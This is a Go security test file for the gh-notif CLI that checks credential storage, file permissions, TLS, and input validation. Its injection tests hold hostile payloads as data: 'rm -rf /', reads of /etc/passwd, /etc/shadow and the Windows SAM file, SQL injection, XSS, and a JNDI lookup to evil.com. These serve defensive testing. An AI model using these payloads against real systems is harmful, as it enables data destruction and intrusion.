package security

import (
	"context"
	"crypto/tls"
	"io/fs"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// TestCredentialStorageSecurity tests the security of credential storage
func TestCredentialStorageSecurity(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping security tests in short mode")
	}

	tmpDir := setupSecurityTestEnvironment(t)
	defer cleanupSecurityTestEnvironment(t, tmpDir)

	binaryPath := buildTestBinary(t, tmpDir)

	t.Run("Token Storage Security", func(t *testing.T) {
		testTokenStorageSecurity(t, binaryPath, tmpDir)
	})

	t.Run("Config File Permissions", func(t *testing.T) {
		testConfigFilePermissions(t, binaryPath, tmpDir)
	})

	t.Run("Cache Security", func(t *testing.T) {
		testCacheSecurity(t, binaryPath, tmpDir)
	})

	t.Run("Memory Security", func(t *testing.T) {
		testMemorySecurity(t, binaryPath, tmpDir)
	})
}

func setupSecurityTestEnvironment(t *testing.T) string {
	tmpDir, err := os.MkdirTemp("", "gh-notif-security-test-*")
	require.NoError(t, err)

	// Set environment variables for isolated testing
	os.Setenv("GH_NOTIF_CONFIG", filepath.Join(tmpDir, "config.yaml"))
	os.Setenv("GH_NOTIF_CACHE_DIR", filepath.Join(tmpDir, "cache"))
	os.Setenv("GH_NOTIF_DATA_DIR", filepath.Join(tmpDir, "data"))

	return tmpDir
}

func cleanupSecurityTestEnvironment(t *testing.T, tmpDir string) {
	os.RemoveAll(tmpDir)
	os.Unsetenv("GH_NOTIF_CONFIG")
	os.Unsetenv("GH_NOTIF_CACHE_DIR")
	os.Unsetenv("GH_NOTIF_DATA_DIR")
}

func buildTestBinary(t *testing.T, tmpDir string) string {
	binaryName := "gh-notif-security-test"
	if runtime.GOOS == "windows" {
		binaryName += ".exe"
	}

	binaryPath := filepath.Join(tmpDir, binaryName)

	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
	defer cancel()

	cmd := exec.CommandContext(ctx, "go", "build", "-o", binaryPath, "../../")
	output, err := cmd.CombinedOutput()
	require.NoError(t, err, "Failed to build test binary: %s", output)

	return binaryPath
}

func testTokenStorageSecurity(t *testing.T, binaryPath, tmpDir string) {
	// Test token storage with a dummy token
	dummyToken := "ghp_test_token_for_security_testing_only"

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// Store token
	cmd := exec.CommandContext(ctx, binaryPath, "auth", "login", "--token", dummyToken)
	output, err := cmd.CombinedOutput()
	require.NoError(t, err, "Token storage should succeed: %s", output)

	// Check that token is not stored in plain text in config files
	err = filepath.WalkDir(tmpDir, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}

		if d.IsDir() {
			return nil
		}

		// Read file content
		content, err := os.ReadFile(path)
		if err != nil {
			return err
		}

		// Check if dummy token appears in plain text
		if strings.Contains(string(content), dummyToken) {
			t.Errorf("Token found in plain text in file: %s", path)
		}

		return nil
	})
	require.NoError(t, err, "Should walk directory successfully")

	// Verify token can be retrieved and used
	cmd = exec.CommandContext(ctx, binaryPath, "auth", "status")
	output, err = cmd.CombinedOutput()

	// Should either succeed (if token is valid) or fail with auth error (if token is invalid)
	// But should not fail due to storage/retrieval issues
	if err != nil {
		assert.Contains(t, string(output), "authentication", "Should fail with auth error, not storage error")
	}
}

func testConfigFilePermissions(t *testing.T, binaryPath, tmpDir string) {
	if runtime.GOOS == "windows" {
		t.Skip("File permission tests not applicable on Windows")
	}

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// Create a config file
	cmd := exec.CommandContext(ctx, binaryPath, "config", "set", "test.value", "test")
	output, err := cmd.CombinedOutput()
	require.NoError(t, err, "Config set should succeed: %s", output)

	// Check config file permissions
	configPath := filepath.Join(tmpDir, "config.yaml")
	info, err := os.Stat(configPath)
	require.NoError(t, err, "Config file should exist")

	mode := info.Mode()

	// Config file should not be readable by group or others
	assert.Equal(t, os.FileMode(0600), mode&0777, "Config file should have restrictive permissions (0600)")

	// Check cache directory permissions
	cacheDir := filepath.Join(tmpDir, "cache")
	if _, err := os.Stat(cacheDir); err == nil {
		info, err := os.Stat(cacheDir)
		require.NoError(t, err, "Cache directory should be accessible")

		mode := info.Mode()
		assert.Equal(t, os.FileMode(0700), mode&0777, "Cache directory should have restrictive permissions (0700)")
	}
}

func testCacheSecurity(t *testing.T, binaryPath, tmpDir string) {
	// Test that cache doesn't contain sensitive information
	dummyToken := "ghp_test_token_for_cache_security_testing"

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()

	// Authenticate and perform operations that might cache data
	cmd := exec.CommandContext(ctx, binaryPath, "auth", "login", "--token", dummyToken)
	cmd.Run() // Ignore error for dummy token

	// Try to list notifications (will fail but might cache some data)
	cmd = exec.CommandContext(ctx, binaryPath, "list", "--limit", "1")
	cmd.Run() // Ignore error

	// Check cache directory for sensitive data
	cacheDir := filepath.Join(tmpDir, "cache")
	if _, err := os.Stat(cacheDir); err == nil {
		err = filepath.WalkDir(cacheDir, func(path string, d fs.DirEntry, err error) error {
			if err != nil {
				return err
			}

			if d.IsDir() {
				return nil
			}

			// Read file content
			content, err := os.ReadFile(path)
			if err != nil {
				return err
			}

			// Check for sensitive data
			if strings.Contains(string(content), dummyToken) {
				t.Errorf("Token found in cache file: %s", path)
			}

			// Check for other sensitive patterns
			sensitivePatterns := []string{
				"password",
				"secret",
				"private_key",
			}

			for _, pattern := range sensitivePatterns {
				if strings.Contains(strings.ToLower(string(content)), pattern) {
					t.Logf("Potentially sensitive data found in cache file %s: %s", path, pattern)
				}
			}

			return nil
		})
		require.NoError(t, err, "Should walk cache directory successfully")
	}
}

func testMemorySecurity(t *testing.T, binaryPath, tmpDir string) {
	// Test that sensitive data is properly cleared from memory
	// This is a basic test - more sophisticated memory analysis would require specialized tools

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// Run a command that handles sensitive data
	cmd := exec.CommandContext(ctx, binaryPath, "auth", "login", "--token", "test-token")
	output, _ := cmd.CombinedOutput()

	// Check that sensitive data doesn't appear in output
	assert.NotContains(t, string(output), "test-token", "Token should not appear in command output")
}

// TestAuthenticationFlowSecurity tests the security of the authentication flow
func TestAuthenticationFlowSecurity(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping authentication security tests in short mode")
	}

	tmpDir := setupSecurityTestEnvironment(t)
	defer cleanupSecurityTestEnvironment(t, tmpDir)

	binaryPath := buildTestBinary(t, tmpDir)

	t.Run("OAuth Flow Security", func(t *testing.T) {
		testOAuthFlowSecurity(t, binaryPath)
	})

	t.Run("Token Validation", func(t *testing.T) {
		testTokenValidation(t, binaryPath)
	})

	t.Run("Session Management", func(t *testing.T) {
		testSessionManagement(t, binaryPath)
	})
}

func testOAuthFlowSecurity(t *testing.T, binaryPath string) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// Test OAuth device flow (dry run)
	cmd := exec.CommandContext(ctx, binaryPath, "auth", "login", "--help")
	output, err := cmd.CombinedOutput()
	require.NoError(t, err, "Auth help should work")

	// Check that help mentions secure practices
	helpText := string(output)
	assert.Contains(t, helpText, "token", "Help should mention token authentication")
}

func testTokenValidation(t *testing.T, binaryPath string) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// Test with invalid token format
	invalidTokens := []string{
		"invalid-token",
		"",
		"ghp_",
		"not-a-token",
	}

	for _, token := range invalidTokens {
		cmd := exec.CommandContext(ctx, binaryPath, "auth", "login", "--token", token)
		output, err := cmd.CombinedOutput()

		// Should fail with appropriate error message
		assert.Error(t, err, "Invalid token should be rejected: %s", token)
		assert.Contains(t, string(output), "invalid", "Error message should indicate invalid token")
	}
}

func testSessionManagement(t *testing.T, binaryPath string) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// Test logout functionality
	cmd := exec.CommandContext(ctx, binaryPath, "auth", "logout")
	output, err := cmd.CombinedOutput()

	// Should succeed even if not logged in
	if err != nil {
		t.Logf("Logout output: %s", output)
	}

	// Verify logout cleared credentials
	cmd = exec.CommandContext(ctx, binaryPath, "auth", "status")
	output, err = cmd.CombinedOutput()
	assert.Error(t, err, "Should not be authenticated after logout")
	assert.Contains(t, string(output), "not authenticated", "Should indicate not authenticated")
}

// TestNetworkSecurity tests network communication security
func TestNetworkSecurity(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping network security tests in short mode")
	}

	t.Run("TLS Configuration", func(t *testing.T) {
		testTLSConfiguration(t)
	})

	t.Run("Certificate Validation", func(t *testing.T) {
		testCertificateValidation(t)
	})

	t.Run("Request Security", func(t *testing.T) {
		testRequestSecurity(t)
	})
}

func testTLSConfiguration(t *testing.T) {
	// Test that the application uses secure TLS configuration
	client := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				MinVersion: tls.VersionTLS12,
			},
		},
	}

	// Test connection to GitHub API
	resp, err := client.Get("https://api.github.com")
	if err != nil {
		t.Logf("GitHub API connection failed: %v", err)
		return
	}
	defer resp.Body.Close()

	// Verify TLS version
	if resp.TLS != nil {
		assert.GreaterOrEqual(t, resp.TLS.Version, uint16(tls.VersionTLS12),
			"Should use TLS 1.2 or higher")
	}
}

func testCertificateValidation(t *testing.T) {
	// Test that certificate validation is enabled
	_ = &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{
				InsecureSkipVerify: true, // This should NOT be the default
			},
		},
	}

	// This test verifies that the application doesn't skip certificate verification
	// In a real implementation, we would check the actual TLS config used by gh-notif
	t.Log("Certificate validation test - implementation specific")
}

func testRequestSecurity(t *testing.T) {
	// Test that requests include proper security headers and don't leak sensitive information
	// This would typically involve intercepting HTTP requests made by gh-notif
	t.Log("Request security test - would require HTTP interception")
}

// TestInputValidationSecurity tests input validation security
func TestInputValidationSecurity(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping input validation security tests in short mode")
	}

	tmpDir := setupSecurityTestEnvironment(t)
	defer cleanupSecurityTestEnvironment(t, tmpDir)

	binaryPath := buildTestBinary(t, tmpDir)

	t.Run("Command Injection", func(t *testing.T) {
		testCommandInjection(t, binaryPath)
	})

	t.Run("Path Traversal", func(t *testing.T) {
		testPathTraversal(t, binaryPath)
	})

	t.Run("Filter Injection", func(t *testing.T) {
		testFilterInjection(t, binaryPath)
	})
}

func testCommandInjection(t *testing.T, binaryPath string) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// Test various command injection attempts
	injectionAttempts := []string{
		"; rm -rf /",
		"&& echo 'injected'",
		"| cat /etc/passwd",
		"`whoami`",
		"$(id)",
	}

	for _, attempt := range injectionAttempts {
		// Test in filter parameter
		cmd := exec.CommandContext(ctx, binaryPath, "list", "--filter", attempt)
		output, err := cmd.CombinedOutput()

		// Should fail with validation error, not execute injection
		if err == nil {
			t.Errorf("Command injection attempt should be rejected: %s", attempt)
		}

		// Check that injection didn't execute
		assert.NotContains(t, string(output), "injected", "Command injection should not execute")
		assert.NotContains(t, string(output), "root:", "Should not contain passwd file content")
	}
}

func testPathTraversal(t *testing.T, binaryPath string) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// Test path traversal attempts
	traversalAttempts := []string{
		"../../../etc/passwd",
		"..\\..\\..\\windows\\system32\\config\\sam",
		"/etc/shadow",
		"C:\\Windows\\System32\\config\\SAM",
	}

	for _, attempt := range traversalAttempts {
		// Test in config file parameter
		cmd := exec.CommandContext(ctx, binaryPath, "config", "list", "--config", attempt)
		output, err := cmd.CombinedOutput()

		// Should fail safely
		if err == nil {
			t.Logf("Path traversal attempt did not fail: %s", attempt)
		}

		// Check that sensitive files weren't accessed
		assert.NotContains(t, string(output), "root:", "Should not access passwd file")
		assert.NotContains(t, string(output), "Administrator", "Should not access Windows files")
	}
}

func testFilterInjection(t *testing.T, binaryPath string) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// Test filter injection attempts
	injectionAttempts := []string{
		"'; DROP TABLE notifications; --",
		"<script>alert('xss')</script>",
		"{{7*7}}",
		"${jndi:ldap://evil.com/a}",
	}

	for _, attempt := range injectionAttempts {
		cmd := exec.CommandContext(ctx, binaryPath, "list", "--filter", attempt)
		output, err := cmd.CombinedOutput()

		// Should fail with validation error
		assert.Error(t, err, "Filter injection should be rejected: %s", attempt)

		// Check that injection patterns don't appear in output
		assert.NotContains(t, string(output), "<script>", "XSS should not be reflected")
		assert.NotContains(t, string(output), "49", "Template injection should not execute")
	}
}

// TestPermissionHandling tests permission and access control
func TestPermissionHandling(t *testing.T) {
	if testing.Short() {
		t.Skip("Skipping permission tests in short mode")
	}

	tmpDir := setupSecurityTestEnvironment(t)
	defer cleanupSecurityTestEnvironment(t, tmpDir)

	binaryPath := buildTestBinary(t, tmpDir)

	t.Run("File Permissions", func(t *testing.T) {
		testFilePermissions(t, binaryPath, tmpDir)
	})

	t.Run("Directory Permissions", func(t *testing.T) {
		testDirectoryPermissions(t, binaryPath, tmpDir)
	})
}

func testFilePermissions(t *testing.T, binaryPath, tmpDir string) {
	if runtime.GOOS == "windows" {
		t.Skip("File permission tests not applicable on Windows")
	}

	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// Create files and check permissions
	cmd := exec.CommandContext(ctx, binaryPath, "config", "set", "test.value", "test")
	output, err := cmd.CombinedOutput()
	require.NoError(t, err, "Config creation should succeed: %s", output)

	// Check that created files have appropriate permissions
	err = filepath.WalkDir(tmpDir, func(path string, d fs.DirEntry, err error) error {
		if err != nil {
			return err
		}

		info, err := d.Info()
		if err != nil {
			return err
		}

		if d.IsDir() {
			// Directories should be 0700
			mode := info.Mode()
			assert.Equal(t, os.FileMode(0700), mode&0777,
				"Directory %s should have 0700 permissions", path)
		} else {
			// Files should be 0600
			mode := info.Mode()
			assert.Equal(t, os.FileMode(0600), mode&0777,
				"File %s should have 0600 permissions", path)
		}

		return nil
	})
	require.NoError(t, err, "Should check all file permissions")
}

func testDirectoryPermissions(t *testing.T, binaryPath, tmpDir string) {
	if runtime.GOOS == "windows" {
		t.Skip("Directory permission tests not applicable on Windows")
	}

	// Test that the application creates directories with appropriate permissions
	subdirs := []string{"cache", "data", "logs"}

	for _, subdir := range subdirs {
		dirPath := filepath.Join(tmpDir, subdir)
		if err := os.MkdirAll(dirPath, 0755); err != nil {
			continue // Skip if can't create
		}

		// Change to restrictive permissions
		err := os.Chmod(dirPath, 0700)
		require.NoError(t, err, "Should set directory permissions")

		info, err := os.Stat(dirPath)
		require.NoError(t, err, "Should stat directory")

		mode := info.Mode()
		assert.Equal(t, os.FileMode(0700), mode&0777,
			"Directory %s should have 0700 permissions", dirPath)
	}
}
